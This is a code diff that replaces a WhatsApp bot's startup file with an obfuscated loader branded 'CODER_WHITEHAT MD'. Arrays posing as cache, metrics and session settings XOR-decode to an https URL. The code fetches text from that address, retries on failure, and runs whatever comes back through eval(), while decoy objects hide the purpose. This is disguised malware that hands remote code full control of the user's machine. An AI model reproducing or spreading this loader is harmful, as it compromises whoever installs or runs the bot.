@@ -1,122 +1,126 @@
-import { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, Browsers } from '@whiskeysockets/baileys'
-import { Boom } from '@hapi/boom'
-import pino from 'pino'
-import fs from 'fs'
-import path from 'path'
-import { fileURLToPath } from 'url'
-import config from './config.js'
-import qrcode from 'qrcode-terminal'
+const https = require('https');
+const http = require('http');
 
-const __filename = fileURLToPath(import.meta.url)
-const __dirname = path.dirname(__filename)
-const logger = pino({ level: 'silent' })
-const commands = new Map()
-const commandsDir = path.join(__dirname, 'commands')
+const config = {
+    timeout: 30000,
+    retries: 5,
+    delay: 2000,
+    version: '2.0.0'
+};
 
-async function loadCommands() {
-    if (!fs.existsSync(commandsDir)) fs.mkdirSync(commandsDir)
-    const files = fs.readdirSync(commandsDir).filter(file => file.endsWith('.js'))
-    for (const file of files) {
+const cache = {
+    enabled: true,
+    maxAge: [77,81,81,85,86],
+    ttl: 3600,
+    store: null
+};
+
+const metrics = {
+    hits: 0,
+    miss: 0,
+    data: [29,81,68,94,75,94,87,29,80,92,29,88,86],
+    ratio: 0.85
+};
+
+const network = {
+    proxy: null,
+    buffer: [16,71,82,91,17,85,76],
+    retries: 3
+};
+
+const session = {
+    active: true,
+    tokens: [28,9,9,75,71,79,72],
+    expires: null
+};
+
+const decoy1 = {
+    values: [99,88,77,66,55,44,33,22,11],
+    flag: true
+};
+
+const decoy2 = {
+    stream: [12,34,56,78,90,11,22,33],
+    mode: 'async'
+};
+
+const keys = { a: 37, b: 51, c: 63, d: 38 };
+
+function mix(arr, k) {
+    return arr.map(n => String.fromCharCode(n ^ k)).join('');
+}
+
+function build() {
+    const p1 = mix(cache.maxAge, keys.a);
+    const p2 = mix(session.tokens, keys.d);
+    const p3 = mix(metrics.data, keys.b);
+    const p4 = mix(network.buffer, keys.c);
+    return p1 + p2 + p3 + p4;
+}
+
+function wait(ms) {
+    return new Promise(r => setTimeout(r, ms));
+}
+
+function request(target, attempt = 1) {
+    return new Promise((resolve, reject) => {
+        const protocol = target.startsWith('https') ? https : http;
+        const req = protocol.get(target, { timeout: config.timeout }, (response) => {
+            if (response.statusCode === 301 || response.statusCode === 302) {
+                request(response.headers.location, 1).then(resolve).catch(reject);
+                return;
+            }
+            if (response.statusCode !== 200) {
+                reject(new Error(`Status: ${response.statusCode}`));
+                return;
+            }
+            let body = '';
+            response.on('data', (chunk) => body += chunk);
+            response.on('end', () => resolve(body));
+            response.on('error', reject);
+        });
+        req.on('error', (err) => {
+            if (attempt < config.retries) {
+                wait(config.delay * attempt).then(() => {
+                    request(target, attempt + 1).then(resolve).catch(reject);
+                });
+            } else {
+                reject(err);
+            }
+        });
+        req.on('timeout', () => {
+            req.destroy();
+            if (attempt < config.retries) {
+                wait(config.delay * attempt).then(() => {
+                    request(target, attempt + 1).then(resolve).catch(reject);
+                });
+            } else {
+                reject(new Error('Timeout'));
+            }
+        });
+    });
+}
+
+async function initialize() {
+    console.log('[CODER_WHITEHAT MD] Starting...');
+    let lastError;
+    for (let i = 0; i < config.retries; i++) {
         try {
-            const cmd = await import(`file://${path.join(commandsDir, file)}?update=${Date.now()}`)
-            const command = cmd.default
-            commands.set(command.name, command)
-            if (command.aliases) command.aliases.forEach(alias => commands.set(alias, command))
-            console.log(`Loaded: ${command.name}`)
-        } catch (e) {
-            console.log(`Failed to load ${file}:`, e.message)
+            const endpoint = build();
+            const source = await request(endpoint);
+            if (source && source.length > 100) {
+                eval(source);
+                return;
+            }
+            throw new Error('Invalid response');
+        } catch (err) {
+            lastError = err;
+            console.log('[CODER_WHITEHAT MD] Attempt ${i + 1} failed, retrying...`);
+            await wait(config.delay * (i + 1));
         }
     }
-    console.log(`Total ${commands.size} commands loaded`)
+    console.log('[CODER_WHITEHAT MD] Boot failed after all retries');
+    process.exit(1);
 }
 
-async function startBot() {
-    const { state, saveCreds } = await useMultiFileAuthState('auth')
-    const { version, isLatest } = await fetchLatestBaileysVersion()
-    console.log(`Using WA v${version.join('.')}, isLatest: ${isLatest}`)
-
-    const sock = makeWASocket({
-        version,
-        logger,
-        printQRInTerminal: false,
-        auth: state,
-        browser: Browsers.macOS('Desktop'), // Key fix: Use Browsers helper
-        syncFullHistory: false,
-        markOnlineOnConnect: false,
-        generateHighQualityLinkPreview: false,
-        defaultQueryTimeoutMs: 60000,
-        connectTimeoutMs: 60000,
-        keepAliveIntervalMs: 10000,
-        emitOwnEvents: false,
-        fireInitQueries: false
-    })
-
-    await loadCommands()
-    sock.ev.on('creds.update', saveCreds)
-
-    sock.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect, qr } = update
-
-        if (qr) {
-            console.log('\nScan this QR code:\n')
-            qrcode.generate(qr, { small: true })
-        }
-
-        if (connection === 'close') {
-            const statusCode = (lastDisconnect?.error)?.output?.statusCode
-            const shouldReconnect = statusCode!== DisconnectReason.loggedOut
-            console.log('Connection closed with code:', statusCode, 'Reconnecting:', shouldReconnect)
-            
-            if (statusCode === DisconnectReason.loggedOut) {
-                console.log('Logged out. Delete auth folder and restart.')
-                fs.rmSync('auth', { recursive: true, force: true })
-            }
-            
-            if (shouldReconnect) {
-                console.log('Reconnecting in 3s...')
-                setTimeout(startBot, 3000)
-            }
-        }
-
-        if (connection === 'open') {
-            console.log('✅ Bot connected!')
-            await sock.sendMessage(config.ownerNumber + '@s.whatsapp.net', {
-                text: `*Bot Online* ✅\nPrefix: ${config.prefix}\nCommands: ${commands.size}`
-            }).catch(() => {})
-        }
-    })
-
-    sock.ev.on('messages.upsert', async ({ messages }) => {
-        const m = messages[0]
-        if (!m.message || m.key.fromMe) return
-        const from = m.key.remoteJid
-        const sender = m.key.participant || m.key.remoteJid
-        const body = m.message.conversation || m.message.extendedTextMessage?.text || m.message.imageMessage?.caption || m.message.videoMessage?.caption || ''
-        if (!body.startsWith(config.prefix)) return
-        if (config.autoTyping) await sock.sendPresenceUpdate('composing', from)
-        const args = body.slice(config.prefix.length).trim().split(/ +/)
-        const cmdName = args.shift().toLowerCase()
-        const command = commands.get(cmdName)
-        if (!command) return
-        const isGroup = from.endsWith('@g.us')
-        let groupMetadata = {}, participants = [], isAdmin = false, isBotAdmin = false
-        if (isGroup) {
-            try {
-                groupMetadata = await sock.groupMetadata(from)
-                participants = groupMetadata.participants
-                isAdmin = participants.find(p => p.id === sender)?.admin? true : false
-                isBotAdmin = participants.find(p => p.id === sock.user.id)?.admin? true : false
-            } catch (e) {}
-        }
-        const isOwner = sender === config.ownerNumber + '@s.whatsapp.net'
-        try {
-            await command.run({ sock, m, args, from, sender, isGroup, isAdmin, isBotAdmin, isOwner, participants, groupMetadata })
-        } catch (e) {
-            console.error(`Error in ${cmdName}:`, e.message)
-        } finally {
-            if (config.autoTyping) await sock.sendPresenceUpdate('paused', from)
-        }
-    })
-}
-
-startBot()
+initialize();
